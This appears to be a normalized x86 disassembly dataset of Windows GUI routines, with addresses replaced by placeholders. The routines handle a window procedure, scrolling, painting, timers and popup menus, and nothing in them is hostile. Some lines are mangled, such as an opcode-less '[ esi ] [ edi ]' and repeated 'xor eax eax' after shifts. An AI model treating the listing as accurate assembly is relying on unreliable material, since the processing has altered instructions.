add ebx edx
mov edx [ ebp + 0x8 ]
push esi
push ebx
push ecx
mov ecx esp
mov [ ecx ] eax
push ecx
mov eax esp
mov [ eax ] edx
call sub_428e20
mov ecx [ esi + 0x4 ]
add esp 0x14
test ecx ecx
jne r-xdata
test edx edx
jne r-xdata
add ecx edi
cmp eax ecx
jae r-xdata
mov eax [ esi + 0x8 ]
sub eax ecx
sar eax 0x4
xor eax eax
jmp r-xdata
mov eax [ esi + 0x8 ]
sub eax edx
sar eax 0x4
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
add ecx eax
shl edi 0x4
add edi eax
mov [ esi + 0xc ] ecx
mov [ esi + 0x8 ] edi
mov [ esi + 0x4 ] eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
push ecx
call j_sub_4b66ed#2
add esp 0x4
add edi eax
test ecx ecx
je r-xdata
add eax edi
sub_4298c0
push ebp
mov ebp esp
push 0xffffffff
push sub_4bfd80
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
mov ecx [ edi + 0x4 ]
test ecx ecx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] esi
jne r-xdata
mov eax [ edi + 0x8 ]
sub eax ecx
sar eax 0x4
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
mov eax [ edi + 0x8 ]
mov edi [ edi + 0x4 ]
push edx
push esi
push ecx
push eax
push edi
mov [ ebp - 0x4 ] 0x0
call sub_428e20
add esp 0x14
mov [ esi + 0x8 ] eax
push eax
mov ecx esi
call sub_4295b0
test al al
je r-xdata
sub_429960
push esi
mov esi ecx
push edi
mov edi [ esi + 0x4 ]
test edi edi
jne r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edi
sar ecx 0x4
xor ecx ecx
jmp r-xdata
test edi edi
je r-xdata
test edi edi
jne r-xdata
mov eax [ esp + 0xc ]
cmp ecx eax
jae r-xdata
pop edi
pop esi
retn 0x14
mov edx [ esi + 0x8 ]
mov ecx edx
sub ecx edi
sar ecx 0x4
cmp eax ecx
jae r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edi
sar ecx 0x4
xor ecx ecx
jmp r-xdata
shl eax 0x4
add eax edi
cmp eax edx
je r-xdata
sub eax ecx
lea edx [ esp + 0x10 ]
push edx
push eax
push ecx
mov ecx [ esi + 0x8 ]
mov eax esp
mov [ eax ] ecx
mov ecx esi
call sub_429610
pop edi
pop esi
retn 0x14
mov ecx [ esp + 0xc ]
push ecx
push eax
push ecx
mov eax esp
mov [ eax ] edx
push ecx
mov eax esp
mov [ eax ] edx
call sub_428cd0
add esp 0x10
mov [ esi + 0x8 ] eax
sub_4299f0
mov edx [ esp - 0x10 ]
sub esp 0x10
sub esp 0x10
mov eax esp
mov [ eax ] edx
mov edx [ esp + 0x14 ]
mov [ eax + 0x4 ] edx
mov edx [ esp + 0x18 ]
mov [ eax + 0x8 ] edx
mov edx [ esp + 0x1c ]
mov [ eax + 0xc ] edx
mov eax [ esp + 0x24 ]
push eax
call sub_429960
add esp 0x10
retn 0x4
sub_429a30
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4bfd98
push eax
mov eax [ rw-data ]
mov [ fs : 0x0 ] esp
sub esp 0x7c
test eax eax
je r-xdata
mov ecx [ esp + 0x7c ]
mov [ fs : 0x0 ] ecx
add esp 0x88
retn
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
push esi
mov esi [ esp + 0x90 ]
test esi esi
jl r-xdata
pop esi
mov edx [ rw-data ]
test edx edx
jne r-xdata
mov ecx [ rw-data ]
sub ecx edx
sar ecx 0x4
xor ecx ecx
jmp r-xdata
push ebx
push ebp
push edi
lea ecx [ esp + 0x50 ]
push ecx
push eax
call [ GetClientRect@IAT ]
mov ecx [ esp + 0x50 ]
mov eax [ esp + 0x58 ]
lea edx [ esp + 0x13 ]
push edx
sub eax ecx
push eax
lea ecx [ esp + 0x28 ]
push esi
push ecx
call sub_428e60
mov edx [ eax + 0x8 ]
mov ebp [ eax ]
mov edi [ eax + 0x4 ]
mov eax [ eax + 0xc ]
mov ebx [ rw-data ]
mov [ esp + 0x4c ] eax
mov eax esi
shl eax 0x4
mov ecx [ eax + ebx ]
add eax ebx
mov ebx [ eax + 0xc ]
mov [ esp + 0x30 ] ecx
mov ecx [ eax + 0x8 ]
mov [ esp + 0x48 ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x38 ] ecx
mov ecx rw-data
add esp 0x10
mov [ esp + 0x24 ] edx
mov [ esp + 0x1c ] ecx
call sub_404310
mov edx [ rw-data ]
push edx
mov [ esp + 0x98 ] 0x0
call [ GetDC@IAT ]
push r-xdata
push 0x1
push 0x0
mov esi eax
call [ CreatePen@IAT ]
push eax
push esi
mov [ esp + 0x20 ] eax
call [ SelectObject@IAT ]
mov [ esp + 0x14 ] eax
mov eax [ esp + 0x3c ]
push 0x0
add eax 0xfffffffe
push eax
push ebp
push esi
call [ MoveToEx@IAT ]
push edi
push ebp
push esi
call [ LineTo@IAT ]
mov eax [ esp + 0x38 ]
push edi
dec eax
push eax
push esi
call [ LineTo@IAT ]
mov ecx [ esp + 0x3c ]
mov eax [ esp + 0x38 ]
dec ecx
push ecx
dec eax
push eax
push esi
call [ LineTo@IAT ]
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp esi ecx
jge r-xdata
mov eax [ rw-data ]
mov ecx [ esp + 0x9c ]
cmp eax ecx
mov eax [ esp + 0x24 ]
jne r-xdata
cmp [ eax + 0x380 ] 0x3
jne r-xdata
mov ecx [ esp + 0x20 ]
mov edx [ rw-data ]
push 0xcc0020
push eax
push ecx
sub ebx eax
mov eax [ esp + 0x34 ]
push edx
push ebx
sub eax ecx
push eax
lea eax [ edi + 0x1 ]
push eax
inc ebp
push ebp
push esi
call [ BitBlt@IAT ]
mov edx [ esp + 0x20 ]
mov ecx [ rw-data ]
push 0x1
push eax
push edx
push ecx
sub ebx eax
push ebx
mov ebx [ esp + 0x3c ]
mov ecx edx
lea edx [ edi + 0x1 ]
sub ebx ecx
push edx
inc ebp
push ebp
push esi
call sub_4287d0
add esp 0x20
jmp r-xdata
cmp [ eax + 0x34 ] 0x10
jb r-xdata
mov eax [ esp + 0x14 ]
push eax
push esi
call [ SelectObject@IAT ]
mov ecx [ esp + 0x18 ]
push ecx
call [ DeleteObject@IAT ]
mov edx [ rw-data ]
push esi
push edx
call [ ReleaseDC@IAT ]
mov ecx rw-data
call sub_401420
pop edi
pop ebp
pop ebx
mov eax [ rw-data ]
test eax eax
jle r-xdata
mov al [ esp + 0x13 ]
test al al
je r-xdata
add eax 0x20
mov eax [ eax + 0x20 ]
jmp r-xdata
mov ecx [ rw-data ]
push 0xfffffff0
push ecx
mov [ esp + 0x78 ] 0x1c
mov [ esp + 0x7c ] 0x1
call [ GetWindowLongA@IAT ]
test eax 0x100000
mov ebp [ GetScrollInfo@IAT ]
jne r-xdata
mov eax [ esp + 0x9c ]
mov ecx [ esp + 0x20 ]
mov edx [ rw-data ]
push 0x0
mov [ rw-data ] eax
mov eax [ esp + 0x28 ]
push eax
push ecx
push edx
sub ebx eax
push ebx
mov ebx [ esp + 0x3c ]
mov edx ecx
lea eax [ edi + 0x1 ]
sub ebx edx
push eax
inc ebp
push ebp
push esi
call sub_4287d0
add esp 0x20
jmp r-xdata
mov edx [ esp + 0x9c ]
mov ecx [ rw-data ]
imul edx edx 0x1c
push eax
add edx ecx
push edx
call sub_401380
add esp 0x8
test al al
je r-xdata
mov eax [ rw-data ]
lea edx [ esp + 0x70 ]
push edx
push 0x0
push eax
call ebp
mov ebx [ esp + 0x7c ]
inc ebx
mov ebx [ esp + 0x58 ]
sub ebx [ esp + 0x50 ]
jmp r-xdata
mov eax [ rw-data ]
lea edx [ esp + 0x70 ]
push edx
push 0x1
push eax
call ebp
mov eax [ esp + 0x7c ]
inc eax
mov eax [ esp + 0x5c ]
sub eax [ esp + 0x54 ]
jmp r-xdata
mov ecx [ rw-data ]
push 0xfffffff0
push ecx
call [ GetWindowLongA@IAT ]
test eax 0x200000
jne r-xdata
mov ebx [ rw-data ]
push 0x3
push edi
push ecx
push esi
sub eax edi
push eax
push edi
push ecx
push esi
call sub_4287d0
add esp 0x20
cmp [ edx + 0x380 ] 0x3
jne r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
mov [ esp + 0x6c ] eax
mov eax [ rw-data ]
mov [ esp + 0x60 ] ecx
mov ecx [ esp + 0x38 ]
add eax ecx
mov [ esp + 0x64 ] edx
mov edx [ rw-data ]
test edx edx
mov [ esp + 0x48 ] eax
mov eax [ esp + 0x3c ]
mov [ esp + 0x68 ] ebx
mov [ esp + 0x40 ] ecx
mov [ esp + 0x44 ] edi
mov [ esp + 0x4c ] eax
je r-xdata
cmp [ edx + 0x34 ] 0x10
jb r-xdata
add edx 0x20
mov edx [ edx + 0x20 ]
jmp r-xdata
mov eax [ esp + 0x4c ]
mov edi [ esp + 0x44 ]
mov ecx [ esp + 0x40 ]
push 0x0
push 0x0
lea ecx [ esp + 0x68 ]
push ecx
push 0x1
push 0x0
lea edx [ esp + 0x54 ]
push edx
push esi
call sub_45cef0
add esp 0x1c
jmp r-xdata
mov eax [ esp + 0x9c ]
mov ebp [ rw-data ]
imul eax eax 0x1c
add eax ebp
push edx
push eax
call sub_401380
add esp 0x8
test al al
je r-xdata
sub_429e00
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
push eax
mov [ rw-data ] 0xffffffff
call sub_429a30
mov eax [ esi + 0x380 ]
add esp 0x4
cmp eax 0x3
jne r-xdata
push ebx
push ebp
xor ebp ebp
push edi
xor ebx ebx
mov eax [ rw-data ]
sub eax ecx
sar eax 0x4
xor eax eax
jmp r-xdata
pop edi
pop ebp
pop ebx
cmp [ esi + 0x34 ] 0x10
jb r-xdata
cmp ebp eax
jge r-xdata
add esi 0x20
mov esi [ esi + 0x20 ]
jmp r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
mov ecx [ rw-data ]
mov eax esi
add ecx ebx
lea edi [ eax + 0x1 ]
jmp r-xdata
mov edx [ ecx + 0x14 ]
sub eax edi
push eax
push esi
push edx
push 0x0
call sub_401150
test eax eax
jne r-xdata
mov esi [ esp + 0x14 ]
inc ebp
add ebx 0x1c
jmp r-xdata
push ebp
call sub_429a30
add esp 0x4
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
sub_429ec0
push 0xffffffff
push sub_4bfdc0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x30
push esi
push rw-data
lea ecx [ esp + 0x18 ]
call sub_40dcd0
xor esi esi
push rw-data
lea ecx [ esp + 0x28 ]
mov [ esp + 0x40 ] esi
call sub_4298c0
mov ecx [ rw-data ]
cmp ecx esi
mov [ esp + 0x3c ] 0x1
jne r-xdata
mov eax [ ecx ]
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push ebx
push ebp
mov [ esp + 0x18 ] esi
mov [ esp + 0x14 ] esi
push edi
cmp eax ecx
mov [ esp + 0x4 ] eax
je r-xdata
mov eax [ esp + 0x28 ]
test eax eax
je r-xdata
push 0x0
push 0x0
push eax
call [ InvalidateRect@IAT ]
cmp ebp edx
jge r-xdata
mov ecx [ esp + 0x28 ]
sub ecx edx
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add edx eax
mov esi [ esp + 0x18 ]
test esi esi
je r-xdata
push eax
call j_sub_4b66ed#2
add esp 0x4
mov ecx [ esp + 0x10 ]
mov eax [ ecx ]
mov esi [ esp + 0x18 ]
mov edx [ esp + 0x1c ]
mov ecx [ rw-data ]
add esi 0x1c
add edx 0x10
cmp eax ecx
mov [ esp + 0x10 ] eax
mov [ esp + 0x18 ] esi
mov [ esp + 0x1c ] edx
jne r-xdata
mov ecx [ esp + 0x10 ]
mov eax [ ecx + 0x8 ]
mov ecx [ eax + 0x34 ]
add eax 0x1c
mov ebx 0x10
cmp ecx ebx
jb r-xdata
mov ecx [ esp + 0x34 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x3c
retn
mov edx [ esp + 0x10 ]
mov ecx [ esp + 0x1c ]
push edx
lea eax [ esp + 0x18 ]
push eax
push ecx
push esi
call sub_402270
push esi
call j_sub_4b66ed#2
add esp 0x14
mov edx [ esp + 0x24 ]
lea eax [ edx + 0x14 ]
xor ebp ebp
mov esi eax
pop edi
pop ebp
pop ebx
lea edi [ eax + 0x4 ]
mov edi [ eax + 0x4 ]
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
mov edx [ esi ]
test edx edx
je r-xdata
mov eax edi
lea edx [ eax + 0x1 ]
mov edi edi
cmp edx eax
jb r-xdata
cmp edx eax
mov ecx edx
jb r-xdata
mov edx [ esp + 0x24 ]
inc ebp
add esi 0x1c
jmp r-xdata
xor ebx ebx
cmp edx eax
setne bl
test ebx ebx
je r-xdata
cmp [ esi + 0x4 ] ebx
jb r-xdata
mov ecx eax
test edx edx
mov [ esp + 0x14 ] esi
je r-xdata
mov edx [ esp + 0x10 ]
mov eax [ edx + 0x8 ]
mov ecx [ eax + 0x34 ]
add eax 0x1c
cmp ecx 0x10
jb r-xdata
add esi 0xfffffff0
mov esi [ esi - 0x10 ]
jmp r-xdata
lea ecx [ eax + 0x4 ]
mov ecx [ eax + 0x4 ]
jmp r-xdata
test ebx ebx
mov esi [ esp + 0x14 ]
jne r-xdata
sbb ebx ebx
sbb ebx 0xffffffff
xor ebx ebx
[ esi ] [ edi ]
je r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax esi
push eax
mov eax [ rw-data ]
push ecx
mov ecx [ esp + 0x20 ]
add ecx eax
call sub_401e80
mov edx [ rw-data ]
mov eax [ esp + 0x34 ]
mov ecx [ esp + 0x1c ]
shl ebp 0x4
add ebp eax
add ecx edx
mov eax ebp
mov edx [ eax ]
mov [ ecx ] edx
mov edx [ eax + 0x4 ]
mov [ ecx + 0x4 ] edx
mov edx [ eax + 0x8 ]
mov [ ecx + 0x8 ] edx
mov eax [ eax + 0xc ]
mov [ ecx + 0xc ] eax
mov eax ecx
lea esi [ eax + 0x1 ]
sub_42a0d0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4bfddb
push eax
mov eax [ esp + 0x14 ]
mov [ fs : 0x0 ] esp
sub esp 0x13c
cmp eax 0x200
push ebx
push ebp
mov ebp [ esp + 0x154 ]
push esi
mov esi [ esp + 0x164 ]
push edi
mov edi [ esp + 0x164 ]
ja r-xdata
cmp eax 0x205
ja r-xdata
je r-xdata
cmp eax 0x20a
je r-xdata
je r-xdata
mov al [ rw-data ]
xor ebx ebx
cmp al bl
je r-xdata
cmp eax 0xf
ja r-xdata
mov esi [ esp + 0x15c ]
lea ecx [ esp + 0x14 ]
push ecx
push 0x1
push esi
mov [ esp + 0x20 ] 0x1c
mov [ esp + 0x24 ] 0x7
call [ GetScrollInfo@IAT ]
mov edx [ esp + 0x164 ]
shr edx 0x10
movsx ecx dx
mov eax 0x77777777
imul ecx
sub edx ecx
mov ecx [ esp + 0x24 ]
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
imul edx ecx
imul edx [ rw-data ]
mov eax 0x51eb851f
imul edx
sar edx 0x5
mov eax edx
shr eax 0x1f
add edx eax
mov eax [ esp + 0x28 ]
add eax edx
mov edx [ esp + 0x1c ]
cmp eax edx
mov [ esp + 0x28 ] eax
jge r-xdata
cmp eax 0x2a3
je r-xdata
call [ GetFocus@IAT ]
cmp eax ebp
je r-xdata
sub eax 0x201
je r-xdata
cmp [ rw-data ] bl
jne r-xdata
mov [ rw-data ] bl
jmp r-xdata
sub eax 0x100
je r-xdata
je r-xdata
mov edx [ esp + 0x20 ]
sub edx ecx
lea ecx [ edx + 0x1 ]
cmp eax ecx
jle r-xdata
mov eax edx
mov [ esp + 0x28 ] eax
mov eax [ rw-data ]
or ebx 0xffffffff
cmp eax ebx
mov [ rw-data ] 0x0
je r-xdata
cmp eax 0x501
jne r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
cmp eax ecx
je r-xdata
push ebp
call [ SetFocus@IAT ]
xor edi edi
push edi
push edi
push 0x113
push ebp
mov [ rw-data ] 0xffffffff
mov [ rw-data ] edi
call [ SendMessageA@IAT ]
mov eax esi
push rw-data
shr eax 0x10
movzx ecx si
push eax
push ecx
call sub_428fa0
add esp 0xc
cmp eax 0xffffffff
mov [ rw-data ] eax
je r-xdata
dec eax
je r-xdata
mov eax edi
and eax 0x1
je r-xdata
lea ecx [ esp + 0x14 ]
push ecx
mov [ esp + 0x18 ] 0x10
mov [ esp + 0x1c ] 0x2
mov [ esp + 0x20 ] ebp
call [ _TrackMouseEvent@IAT ]
mov [ rw-data ] 0x1
mov eax [ esp + 0x168 ]
mov ecx [ esp + 0x164 ]
mov edx [ esp + 0x160 ]
push eax
mov eax [ esp + 0x160 ]
push ecx
push edx
push eax
call [ DefWindowProcA@IAT ]
jmp r-xdata
push 0x0
push 0x0
push 0x113
push ebp
mov ebp [ SendMessageA@IAT ]
mov [ rw-data ] 0x1
mov [ rw-data ] 0xffffffff
mov [ rw-data ] 0x0
call ebp
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
sub eax 0x13
je r-xdata
mov ecx rw-data
mov [ esp + 0x40 ] ecx
call sub_404310
mov ebp [ esp + 0x15c ]
lea eax [ esp + 0xac ]
push eax
push ebp
mov [ esp + 0x15c ] 0x0
call [ BeginPaint@IAT ]
mov edx [ rw-data ]
lea ecx [ esp + 0x9c ]
push ecx
push edx
mov edi eax
call [ GetClientRect@IAT ]
mov esi [ esp + 0xa4 ]
mov edx [ esp + 0x9c ]
mov ebx [ esp + 0xa8 ]
mov ecx [ esp + 0xa0 ]
mov eax [ rw-data ]
push 0xfffffff0
sub esi edx
sub ebx ecx
push eax
mov [ esp + 0x58 ] esi
mov [ esp + 0x9c ] ebx
mov [ esp + 0x1c ] 0x1c
mov [ esp + 0x20 ] 0x1
call [ GetWindowLongA@IAT ]
test eax 0x100000
jne r-xdata
dec eax
cmp eax 0x7
ja r-xdata
movzx eax ax
push 0x0
shl eax 0x10
or eax 0x5
push eax
push 0x115
push esi
call [ SendMessageA@IAT ]
mov eax ecx
mov [ esp + 0x28 ] eax
mov esi [ rw-data ]
mov edi [ rw-data ]
push 0x0
push 0x0
push 0x113
push ebp
mov [ rw-data ] 0x1
mov [ rw-data ] ebx
mov [ rw-data ] 0x0
call [ SendMessageA@IAT ]
mov [ rw-data ] esi
mov [ rw-data ] edi
call [ GetFocus@IAT ]
cmp eax [ rw-data ]
je r-xdata
push 0x3
call sub_421f40
push eax
push rw-data
call sub_428d60
add esp 0xc
test al al
jne r-xdata
push eax
call sub_429a30
mov eax [ rw-data ]
add esp 0x4
cmp eax 0xffffffff
je r-xdata
push eax
mov [ rw-data ] ecx
call sub_429a30
mov eax [ rw-data ]
add esp 0x4
mov [ rw-data ] 0x1
mov [ rw-data ] edi
push rw-data
push edi
push 0x3
call sub_4232a0
add esp 0xc
mov [ rw-data ] eax
jmp r-xdata
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] al
call [ ReleaseCapture@IAT ]
jmp r-xdata
dec eax
jne r-xdata
cmp eax ebx
je r-xdata
cmp [ rw-data ] bl
je r-xdata
mov ecx [ esp + 0x14c ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x148
retn 0x10
mov edx [ rw-data ]
lea ecx [ esp + 0x30 ]
push ecx
push edx
mov [ esp + 0x18 ] eax
call [ GetClientRect@IAT ]
mov ebx [ esp + 0x30 ]
mov esi [ esp + 0x38 ]
mov edi [ esp + 0x34 ]
sub esi ebx
mov ebx [ esp + 0x3c ]
lea eax [ esp + 0x67 ]
push eax
sub ebx edi
mov edi [ rw-data ]
push esi
lea ecx [ esp + 0x134 ]
push edi
push ecx
call sub_428e60
mov edx [ eax + 0x4 ]
mov ecx [ eax ]
mov [ esp + 0x28 ] edx
mov edx [ eax + 0x8 ]
mov eax [ eax + 0xc ]
mov [ esp + 0x30 ] eax
mov eax [ esp + 0x174 ]
add eax 0xfffffff3
add esp 0x10
cmp eax 0x1b
ja r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
sub eax 0x2
jne r-xdata
lea ecx [ esp + 0x14 ]
push ecx
push 0x0
push ebp
call [ GetScrollInfo@IAT ]
mov edx [ esp + 0x20 ]
inc edx
mov [ esp + 0x48 ] edx
mov [ esp + 0x48 ] esi
jmp r-xdata
jmp [ eax * 4 + jump_table_42b3ec ]
mov cl [ rw-data ]
test cl cl
mov eax [ rw-data ]
mov [ rw-data ] ebx
jne r-xdata
push 0x3
call sub_421f40
add esp 0x4
push eax
mov ecx rw-data
call sub_402510
push 0x0
call sub_489430
add esp 0x4
jmp r-xdata
mov ecx rw-data
call sub_41eb60
test al al
jne r-xdata
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
cmp eax ecx
je r-xdata
push ebp
call [ SetFocus@IAT ]
push rw-data
call [ GetCursorPos@IAT ]
push ebp
call [ SetCapture@IAT ]
call [ GetFocus@IAT ]
cmp eax ebp
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
jl r-xdata
mov [ rw-data ] ebx
cmp [ rw-data ] 0xffffffff
je r-xdata
lea edx [ esp + 0x40 ]
push edx
call [ GetCursorPos@IAT ]
mov ecx [ rw-data ]
lea eax [ esp + 0x14 ]
push eax
push ecx
call [ GetWindowRect@IAT ]
mov ecx [ rw-data ]
mov edx [ esp + 0x44 ]
mov eax [ esp + 0x18 ]
mov edi [ rw-data ]
mov esi [ esp + 0x14 ]
push 0x5
push ebx
sub edx ecx
mov ecx [ rw-data ]
add edx eax
mov eax [ esp + 0x48 ]
push ebx
push edx
sub eax edi
add eax esi
push eax
push ebx
push ecx
call [ SetWindowPos@IAT ]
mov edx [ esp + 0x40 ]
mov eax [ esp + 0x44 ]
mov [ rw-data ] edx
mov [ rw-data ] eax
jmp r-xdata
movzx eax [ eax + lookup_table_42b43c ]
jmp [ eax * 4 + jump_table_42b424 ]
push rw-data
push eax
mov [ rw-data ] eax
call sub_4204e0
add esp 0x8
call [ GetFocus@IAT ]
cmp eax ebp
jne r-xdata
mov edx [ rw-data ]
push 0xfffffff0
push edx
call [ GetWindowLongA@IAT ]
test eax 0x200000
je r-xdata
lea ecx [ esp + 0x14 ]
push ecx
push 0x1
push ebp
call [ GetScrollInfo@IAT ]
mov eax [ esp + 0x20 ]
inc eax
mov eax ebx
jmp r-xdata
mov eax [ rw-data ]
push 0xfffffff0
push eax
call [ GetWindowLongA@IAT ]
test eax 0x200000
jne r-xdata
mov eax [ esp + 0x15c ]
push 0x0
push 0x3e8
push 0x1
push eax
mov [ rw-data ] 0xffffffff
call [ SetTimer@IAT ]
jmp r-xdata
mov ecx [ esp + 0x15c ]
push 0x1
push ecx
call [ KillTimer@IAT ]
jmp r-xdata
push 0x0
call sub_4290f0
mov edx [ esp + 0x160 ]
add esp 0x4
push 0x0
push 0x0
push edx
call [ InvalidateRect@IAT ]
jmp r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push eax
call sub_429a30
add esp 0x4
mov edx [ rw-data ]
imul eax eax 0x1c
mov ecx [ eax + edx + 0x18 ]
add eax edx
cmp ecx 0x10
jb r-xdata
push 0x0
call sub_451770
mov eax [ rw-data ]
add esp 0x4
test eax eax
je r-xdata
push eax
call sub_429a30
add esp 0x4
jmp r-xdata
push eax
mov [ rw-data ] ecx
call sub_429a30
mov eax [ rw-data ]
add esp 0x4
mov edx [ rw-data ]
test edx edx
jne r-xdata
mov eax [ esp + 0x168 ]
movzx esi ax
shr eax 0x10
mov edi eax
push rw-data
push edi
push esi
call sub_428fa0
add esp 0xc
cmp eax 0xffffffff
mov [ rw-data ] eax
je r-xdata
push ebx
push 0x3e8
push 0x1
push ebp
call [ SetTimer@IAT ]
mov edx [ rw-data ]
xor ecx ecx
cmp edx ebx
setne cl
inc ecx
mov [ rw-data ] ecx
jmp r-xdata
test edi edi
push 0x0
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
mov eax edx
sub eax ecx
cdq
sub eax edx
mov ebx eax
sar ebx 0x1
add ebx ecx
dec edi
test edi edi
jl r-xdata
mov eax edx
sub eax ecx
cdq
sub eax edx
sar eax 0x1
add eax ecx
mov [ esp + 0x68 ] eax
lea ebp [ edi + 0x1 ]
nop
cmp edi 0xffffffff
je r-xdata
push 0x1
push ebp
call [ KillTimer@IAT ]
jmp r-xdata
mov eax [ rw-data ]
xor eax eax
mov ebx [ esp + 0x15c ]
lea eax [ esp + 0x14 ]
push eax
push 0x1
push ebx
mov [ esp + 0x20 ] 0x1c
mov [ esp + 0x24 ] 0x7
call [ GetScrollInfo@IAT ]
mov eax [ esp + 0x164 ]
mov esi [ esp + 0x28 ]
mov edi [ esp + 0x24 ]
mov ecx [ esp + 0x20 ]
movzx edx ax
cmp edx 0x5
ja r-xdata
push eax
push eax
lea ecx [ esp + 0x88 ]
push ecx
push 0x1
push eax
lea edx [ esp + 0x28 ]
push edx
push edi
mov [ esp + 0x30 ] eax
mov [ esp + 0x34 ] eax
mov [ esp + 0x38 ] esi
mov [ esp + 0x3c ] ebx
call sub_45cef0
add esp 0x1c
push r-xdata
push 0x1
push eax
call [ CreatePen@IAT ]
push eax
push edi
mov [ esp + 0x70 ] eax
call [ SelectObject@IAT ]
mov ecx [ rw-data ]
mov ebx [ rw-data ]
mov ebp [ rw-data ]
mov [ esp + 0x98 ] eax
mov eax ecx
inc ebx
neg eax
push 0x0
mov [ esp + 0x80 ] ebx
sub ebx ecx
mov ecx [ rw-data ]
mov [ esp + 0x5c ] eax
lea eax [ ebx - 0x1 ]
push 0x0
mov [ esp + 0x3c ] eax
lea eax [ esp + 0x88 ]
push eax
push 0x1
lea edx [ ebx + ecx ]
push 0x0
lea ecx [ esp + 0x44 ]
push ecx
neg ebp
push edi
mov [ esp + 0x78 ] ebp
mov [ esp + 0x7c ] ebx
mov [ esp + 0x4c ] 0x0
mov [ esp + 0x54 ] esi
mov [ esp + 0x58 ] edx
call sub_45cef0
add esp 0x1c
xor eax eax
mov [ esp + 0x4c ] eax
mov [ esp + 0x48 ] eax
mov ecx [ rw-data ]
mov edx [ rw-data ]
mov [ esp + 0x84 ] ecx
mov ecx [ rw-data ]
mov [ esp + 0x8c ] eax
mov [ esp + 0x80 ] edx
mov edx [ esp + 0x48 ]
xor eax eax
cmp ecx eax
mov [ esp + 0x88 ] edx
je r-xdata
push eax
mov [ rw-data ] 0xffffffff
call sub_429a30
add esp 0x4
jmp r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
mov ebp [ esp + 0x15c ]
push 0xcb
push 0xfffffffa
push ebp
mov [ rw-data ] 0x1
call [ GetWindowLongA@IAT ]
push eax
call [ LoadMenuA@IAT ]
mov edi eax
push 0x0
push edi
call [ GetSubMenu@IAT ]
mov ebx [ EnableMenuItem@IAT ]
push 0x1
mov esi eax
push 0xd1
push esi
call ebx
push 0x1
push 0x103
push esi
call ebx
push 0x1
push 0xf9
push esi
call ebx
lea edx [ esp + 0x40 ]
push edx
mov [ rw-data ] 0x0
call [ GetCursorPos@IAT ]
mov eax [ rw-data ]
push 0x0
push eax
call [ GetParent@IAT ]
mov ecx [ esp + 0x48 ]
mov edx [ esp + 0x44 ]
push eax
push 0x0
push ecx
push edx
push 0x0
push esi
call [ TrackPopupMenu@IAT ]
push edi
call [ DestroyMenu@IAT ]
push 0x0
push 0x0
push ebp
mov [ rw-data ] 0x0
call [ InvalidateRect@IAT ]
jmp r-xdata
mov eax [ rw-data ]
mov eax [ rw-data ]
sub eax edx
sar eax 0x4
xor eax eax
jmp r-xdata
xor ecx ecx
push rw-data
push ebx
push 0x3
call sub_4232a0
mov ecx eax
mov eax [ rw-data ]
add esp 0xc
jmp r-xdata
cmp edi ebx
jne r-xdata
call [ MessageBeep@IAT ]
jmp r-xdata
push esi
lea ecx [ edi - 0x1 ]
push ecx
lea edx [ esp + 0x148 ]
push edx
call sub_428e60
mov ecx [ eax ]
mov edx [ eax + 0x8 ]
mov [ esp + 0x24 ] ecx
mov ecx [ eax + 0x4 ]
mov eax [ eax + 0xc ]
add esp 0x10
test ecx ecx
mov [ esp + 0x1c ] edx
mov [ esp + 0x20 ] eax
jge r-xdata
mov eax [ rw-data ]
sub eax ecx
sar eax 0x4
xor eax eax
jmp r-xdata
push 0x0
push 0x0
push esi
lea edx [ esp + 0xf4 ]
push edi
push edx
call sub_428e60
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
mov ebp [ eax + 0x8 ]
mov eax [ eax + 0xc ]
mov [ esp + 0xb8 ] eax
mov eax [ esp + 0x28 ]
add esp 0x10
cmp eax ecx
jle r-xdata
mov eax ecx
sub eax edx
sar eax 0x4
xor eax eax
jmp r-xdata
mov eax [ esp + 0x15c ]
push 0x0
push 0x0
push 0x203
push eax
call ebp
jmp r-xdata
xor eax eax
jmp [ edx * 4 + jump_table_42b40c ]
mov eax ecx
